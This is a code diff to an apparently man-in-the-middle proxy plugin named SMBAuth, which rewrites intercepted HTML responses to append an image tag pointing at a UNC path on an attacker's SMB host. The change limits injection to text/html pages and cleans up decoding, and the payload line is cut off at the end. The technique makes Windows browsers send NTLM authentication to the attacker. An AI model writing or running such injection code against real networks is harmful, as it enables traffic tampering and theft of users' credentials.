@@ -9,16 +9,16 @@ class SMBAuth(Plugin):
     version = '0.1'
 
     def response(self, context, flow):
-        with decoded(flow.response):  # Remove content encoding (gzip, ...)
-            html = BeautifulSoup(flow.response.content)
-            if html.body:
+        if flow.response.headers.get_first("content-type", "").startswith("text/html"):
+            with decoded(flow.response):  # Remove content encoding (gzip, ...)
+                html = BeautifulSoup(flow.response.content.decode('utf-8', 'ignore'))
+                if html.body:
 
-                payload = BeautifulSoup(self._get_payload(), "html.parser")
-                html.body.append(payload)
-                context.log("[SMBAuth] Injected payload: {}".format(flow.request.host))
+                    payload = BeautifulSoup(self._get_payload(), "html.parser")
+                    html.body.append(payload)
+                    context.log("[SMBAuth] Injected payload: {}".format(flow.request.host))
 
-                flow.response.content = str(html)
-                flow.response.headers['Content-Length'] = [str(len(str(html)))]
+                    flow.response.content = str(html)
 
     def _get_payload(self):
         return '<img src=\"\\\\{}\\image.jpg\">'\
